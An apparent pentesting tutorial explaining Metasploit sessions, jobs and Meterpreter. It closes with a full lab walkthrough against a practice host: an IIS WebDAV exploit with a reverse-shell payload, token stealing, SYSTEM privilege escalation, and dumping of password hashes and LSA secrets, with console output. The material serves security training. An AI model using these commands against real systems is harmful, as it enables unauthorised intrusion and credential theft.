# Metasploit Framework: Sessions, Jobs & Meterpreter

---

## Table of Contents

1. [What sessions are for](#1-what-sessions-are-for)
2. [Backgrounding a session](#2-backgrounding-a-session)
3. [Listing and interacting with sessions](#3-listing-and-interacting-with-sessions)
4. [Running post-exploitation modules against a session](#4-running-post-exploitation-modules-against-a-session)
5. [Jobs: when backgrounding a session isn't enough](#5-jobs-when-backgrounding-a-session-isnt-enough)
6. [Meterpreter: the swiss army knife](#6-meterpreter-the-swiss-army-knife)
7. [How Meterpreter establishes itself](#7-how-meterpreter-establishes-itself)
8. [Meterpreter's three design goals](#8-meterpreters-three-design-goals)
9. [Full walkthrough: scan → exploit → escalate → loot](#9-full-walkthrough-scan--exploit--escalate--loot)
10. [Cheat sheet](#10-cheat-sheet)

---

## 1. What sessions are for

Metasploit can juggle **many modules at once**, and this is a big part of what makes `msfconsole` so flexible. The feature that makes this possible is **Sessions**: dedicated control interfaces, one per active, exploited connection.

**Analogy:** think of sessions exactly like browser tabs. Each tab is its own live connection; you can leave one running in the background while you work in another, and switch back to it whenever you need to.

**Key behavior to remember:**

- A **backgrounded** session keeps running and keeps your connection to the target alive.
- A session **can die** if something goes wrong during payload execution and the communication channel breaks down (e.g. the target crashes, network drops, or AV kills the process).

---

## 2. Backgrounding a session

While you're inside an active session (one with a live communication channel to the target), you can send it to the background two ways:

| Method | How |
|---|---|
| Keyboard shortcut | `CTRL` + `Z` |
| Command (works well for Meterpreter) | `background` |

Either way, you'll get a confirmation prompt, and after accepting it you're dropped back to the main `msf6 >` prompt — free to immediately select and run a different module while the original session keeps running quietly in the background.

---

## 3. Listing and interacting with sessions

### Listing active sessions

```
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

**Reading this table:**

| Column | Meaning |
|---|---|
| `Id` | The session's index number — use this to interact with it |
| `Type` | What kind of payload/shell this session is (Meterpreter, shell, etc.) and architecture |
| `Information` | Who you're running as, and on which host |
| `Connection` | The actual network connection details: `attacker_ip:port -> target_ip:port` |

### Re-entering a specific session

```
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

`sessions -i <no.>` drops you right back into that session's interface, exactly where you left off.

---

## 4. Running post-exploitation modules against a session

This is one of the most powerful workflows in Metasploit: using an **already-established foothold** as the launchpad for a second module, instead of starting from scratch.

### The general pattern

```
1. Background the current session (you already have access)
2. Search for the second module you want to run
3. Set that module's SESSION option to the session's index number
4. Run it — the module now operates through the existing foothold
```

Modules used this way almost always live in the **`post`** category (Post-Exploitation). Common sub-types include:

- **Credential gatherers** — pull stored passwords/hashes
- **Local exploit suggesters** — scan the compromised host for privilege-escalation opportunities
- **Internal network scanners** — map out what else is reachable from inside the compromised host

We'll see this exact pattern used in the full walkthrough later in this document.

---

## 5. Jobs: when backgrounding a session isn't enough

Sometimes just backgrounding isn't the right tool. Consider this scenario: you have an active exploit listening on a specific port, and a *different* module also needs that same port. Simply hitting `CTRL` + `C` to kill the old one won't actually free the port — the underlying process may still be holding onto it.

This is where **jobs** come in — they let you see and manage background tasks at a lower level than sessions, including **terminating** them properly so resources like ports get released.

> **Key distinction:** a **session** is your interactive connection to a target. A **job** is a background *task* — which could be a listener waiting for connections, a running module, or other background work. Sessions can be converted into (or associated with) jobs, and jobs persist running in the background even if the session tied to them disappears.

### Viewing the jobs help menu

```
msf6 exploit(multi/handler) > jobs -h

Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

### Running an exploit as a background job

Normally, `exploit` (or `run`) blocks your console until it finishes. Adding `-j` runs it **as a job** instead, freeing up your console immediately:

```
msf6 exploit(multi/handler) > exploit -h

Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
<SNIP>
```

```
msf6 exploit(multi/handler) > exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

### Listing and killing jobs

```
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

| Command | Purpose |
|---|---|
| `jobs -l` | List all running jobs |
| `kill <id>` | Kill a specific job by its index |
| `jobs -K` | Kill **all** running jobs |

---

## 6. Meterpreter: the swiss army knife

Quick recap of `meterpreter`, since this section goes much deeper:

- It's a multi-faceted, **extensible** payload using **DLL injection** to stay stable and hard to detect.
- It can be configured to **persist across reboots**.
- It lives **entirely in memory**, leaving (almost) no disk traces — hard to catch with traditional forensics.

It's often called the **"swiss army knife of pentesting"** because its entire purpose is to make **post-exploitation** easier: enumerating the target from the inside, hunting for privilege escalation paths, researching further vulnerabilities, keeping persistent access, and pivoting into other parts of a network.

> **Worth knowing, outside this module's scope:** Meterpreter also supports **stageless payloads** (the whole thing delivered in one shot, no separate stager/stage dance) and there are techniques for **modifying Metasploit's templates** to improve AV evasion. Both are deeper topics worth researching independently later.

---

## 7. How Meterpreter establishes itself

Selecting a Meterpreter payload is as simple as picking the right entry from `show payloads` for your target OS/architecture/connection type. But it's worth understanding what actually happens behind the scenes once the exploit succeeds:

```
1. Target executes the initial STAGER
   (bind, reverse, findtag, passivex, etc.)
        │
        ▼
2. Stager loads a DLL prefixed with "Reflective"
   (the Reflective stub handles loading/injecting that DLL — no disk write needed)
        │
        ▼
3. Meterpreter CORE initializes
   - Establishes an AES-encrypted link over the socket
   - Sends a GET request
   - Metasploit receives it and configures the client
        │
        ▼
4. Meterpreter loads EXTENSIONS
   - Always loads "stdapi"
   - Loads "priv" too, if the exploit granted administrative rights
   - All extension loading happens over the same AES-encrypted channel
```

**In plain terms:** the small initial stager's whole job is just to get a reliable, encrypted connection open. Once that's solid, the "real" Meterpreter software loads itself in over that connection — and it tailors which extra tools it loads in based on what privilege level you actually landed with.

Once this process completes, you're dropped into a Meterpreter shell, and `help` reveals what's available:

```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
<SNIP>
```

> **Reference tip:** many of these commands are also summarized in Metasploit's own module cheat sheet — worth keeping bookmarked once you start using Meterpreter regularly.

---

## 8. Meterpreter's three design goals

The people who built Meterpreter had three explicit goals in mind, and understanding them helps explain *why* it behaves the way it does.

### Stealthy

- Resides **entirely in memory** — nothing written to disk.
- **No new process** is created; instead, Meterpreter **injects itself** into an already-running, compromised process.
- Can **migrate** between running processes, effectively moving its "home" if needed (e.g. to survive the original process closing, or to borrow a more privileged process's identity).
- As of `msfconsole v6`, **all** communication between you and the target is **AES-encrypted**, protecting both confidentiality and integrity.
- Net effect: **minimal forensic evidence** and **minimal impact** on the compromised machine.

### Powerful

- Uses a **channelized communication system** between attacker and target.
- This is what lets you, for example, spawn a full host-OS shell *inside* your existing Meterpreter session by opening a dedicated channel for it.
- That channel-based traffic is also what carries the AES encryption mentioned above.

### Extensible

- New functionality can be **loaded over the network at runtime** — no need to rebuild or restart.
- Its **modular structure** means capability keeps growing without bloating the core payload.

---

## 9. Full walkthrough: scan → exploit → escalate → loot

This is the centerpiece of this document: a complete, realistic engagement chain, done **entirely from inside `msfconsole`** so every result gets automatically tracked in the database.

### Step 1: scan the target

```
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org )
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Flags used:** `-sV` (version detection), `-p-` (all 65535 ports), `-T5` (fastest timing), `-A` (aggressive — OS detection, scripts, traceroute).

```
msf6 > hosts

Hosts
=====
address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device


msf6 > services

Services
========
host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

### Step 2: recon the finding

Visiting port 80 shows an "Under Construction" page — nothing immediately interesting to look at directly. But the Nmap output already handed over something valuable: the server is running **Microsoft IIS httpd 6.0**, an old version with known vulnerabilities.

> **Lesson:** don't just look at what a service displays — the service **banner/version** itself is often the real lead.

Searching around for known IIS 6.0 vulnerabilities turns up **CVE-2017-7269**, which conveniently already has a Metasploit module.

### Step 3: find and select the exploit

```
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

> **Handy detail:** when you `use` an exploit without picking a payload, Metasploit auto-selects a sensible default (here, `windows/meterpreter/reverse_tcp`) rather than leaving you with nothing configured.

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   RHOSTS                               yes       The target host(s)
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST     10.10.239.181    yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

**Quick read of what this exploit does:** it abuses **WebDAV** (a file-management extension for web servers) to **upload a `.txt` file and then rename/move it to `.asp`** — tricking IIS into treating uploaded content as executable server-side code.

### Step 4: configure and run it

Everything on the target looks like default configuration, so only `RHOST` and `LHOST` need setting:

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0
```

> **Nice shortcut:** `LHOST` was set to `tun0` — the **name of a network interface** — instead of typing out the IP manually. Metasploit resolves this automatically to that interface's actual address.

```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter >
```

### A critical lesson hidden in this output: cleanup can fail

Look closely: Metasploit **tried to delete** the uploaded `.asp` file afterward (since Meterpreter itself runs in memory and doesn't need that file anymore), but the deletion **failed with a 403 Forbidden**.

**Why this matters, from both sides:**

| Perspective | Takeaway |
|---|---|
| **Attacker** | A leftover file like `metasploit28857905.asp` is a liability — it's forensic evidence sitting in plain view, and cleanup isn't guaranteed to succeed. |
| **Defender** | Filenames matching this pattern (or similar auto-generated naming conventions) are a detectable signature. A defender who sets up file-monitoring or regex-based alerts on suspicious uploads can catch — and stop — an attack like this before a shell is even fully spawned. |

> This is a genuinely useful two-sided lesson: automated tools leave artifacts, and those artifacts are exactly what defenders should be watching for.

### Step 5: discovering limited privileges

```
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.
```

Interesting — we can't even check our own username yet. Time to look at what's running on the box to find something more privileged to "borrow."

### Step 6: listing processes and stealing a token

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
<SNIP>
```

`ps` lists running processes — including, helpfully, which **user account** each one runs as. Several processes here run as `NT AUTHORITY\NETWORK SERVICE`, a more privileged account than whatever we currently have.

```
meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

**What just happened:** `steal_token` grabs the **security token** (essentially, the "ID badge" Windows uses to decide what a process is allowed to do) from another running process, and applies it to our own session. We're now acting with that process's permission level, **without actually compromising that process's code** — just borrowing its identity badge.

### Step 7: hitting a wall, and calling in automated help

```
c:\Inetpub>cd AdminScripts

cd AdminScripts
Access is denied.
```

Still not enough privilege to get into an interesting-looking `AdminScripts` folder. Rather than manually researching every possible local privilege escalation technique by hand, Metasploit offers an **automated local exploit suggester**.

### Step 8: background the session, run the suggester

```
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

**This is exactly the "backgrounded session + post module" pattern from earlier explain:** background the live session → search for a `post` module → bind it to that session via `SESSION` → run. The suggester checks the host against **34** known local privilege escalation vulnerabilities and reports which ones look promising.

### Step 9: trying a suggested exploit

Out of the six "appears vulnerable" candidates, `ms15_051_client_copy_image` turns out to be the one that works:

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST     46.101.239.181   yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows x86
```

```
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

**What just happened:** this local exploit **launched its own helper process** (`notepad.exe`), **reflectively injected** the exploit DLL into it (recall "Reflective" DLL loading from earlier — no disk writes), then injected and ran the payload inside that process. The result is a **brand-new Meterpreter session (session 2)** — this time running as `NT AUTHORITY\SYSTEM`, the highest privilege level on Windows.

> Notice we now have **two separate sessions** active (`session 1` from the initial foothold, `session 2` from the privilege escalation) — exactly the kind of multi-session juggling covered earlier in this document.

### Step 10: collecting the loot

With `SYSTEM`-level access, Meterpreter's credential-dumping commands become available:

```
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
<SNIP>
```

`hashdump` pulls password hashes for local accounts straight out of the Windows SAM database.

```
meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca
<SNIP>
```

```
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 ...
<SNIP>
```

**What these commands pull:**

| Command | What it extracts |
|---|---|
| `hashdump` | Local account password hashes from the SAM database |
| `lsa_dump_sam` | A more detailed SAM dump, including domain/syskey context |
| `lsa_dump_secrets` | LSA secrets — can include service account passwords, cached credentials, and DPAPI keys stored by Windows |

### Why this matters beyond this one machine

If this box were part of a larger network, all of this collected **loot** could be used to:

- **Pivot** deeper into the network using the compromised host as a jumping-off point
- **Access internal resources** that weren't reachable from outside
- **Impersonate higher-privilege users** elsewhere on the network, if credentials are reused — a common weakness in poorly segmented environments

---

## 10. Cheat sheet

### Session commands

| Command | Purpose |
|---|---|
| `CTRL`+`Z` or `background` | Send the current session to the background |
| `sessions` | List all active sessions |
| `sessions -i <id>` | Re-enter a specific session |
| `bg` (inside Meterpreter) | Shortcut for backgrounding |

### Job commands

| Command | Purpose |
|---|---|
| `exploit -j` | Run an exploit as a background job instead of blocking the console |
| `jobs -l` | List all running jobs |
| `jobs -i <id>` | Show detailed info about one job |
| `kill <id>` | Terminate a specific job |
| `jobs -K` | Terminate all running jobs |

### Post-exploitation session binding pattern

```
1. background                              # step out of the live session
2. search <post module keyword>             # find the module
3. use <index>
4. set SESSION <session id>
5. run
```

### Key Meterpreter commands seen in this walkthrough

| Command | Purpose |
|---|---|
| `getuid` | Show current effective user |
| `ps` | List running processes (and their owning users) |
| `steal_token <pid>` | Borrow another process's security token |
| `hashdump` | Dump local SAM password hashes |
| `lsa_dump_sam` | Detailed SAM dump |
| `lsa_dump_secrets` | Dump LSA secrets (service passwords, DPAPI keys, etc.) |
| `bg` | Background the current Meterpreter session |

### Big-picture takeaways

1. **Sessions = your live connections; Jobs = background tasks.** Related but distinct — a session can die while a job tied to it keeps running, and vice versa.
2. **`exploit -j`** is the move when you need your console back immediately, or when a port conflict means you need to manage listeners directly via `jobs`.
3. **Meterpreter's three design pillars** — stealthy, powerful, extensible — directly explain its behavior: memory-only, process injection, channelized AES-encrypted comms, and runtime-loadable extensions.
4. **The stager → core → extensions loading sequence** is why Meterpreter sessions "fill out" with capability gradually right after a successful exploit.
5. **The "background session → bind a post module via SESSION" pattern** is the backbone of real-world post-exploitation workflows — local exploit suggesters, credential gatherers, and network scanners all use it.
6. **Automated tools leave artifacts.** The failed file-deletion in the walkthrough is a genuine two-sided lesson: attackers must account for incomplete cleanup, and defenders can watch for these exact patterns.
7. **Token stealing lets you "borrow" privilege** from another running process without actually compromising that process's code.
8. **The full attack chain — initial foothold → privilege escalation → credential dumping — is rarely one single exploit.** It's usually a sequence of smaller, chained steps, each building on the session established by the last.

---
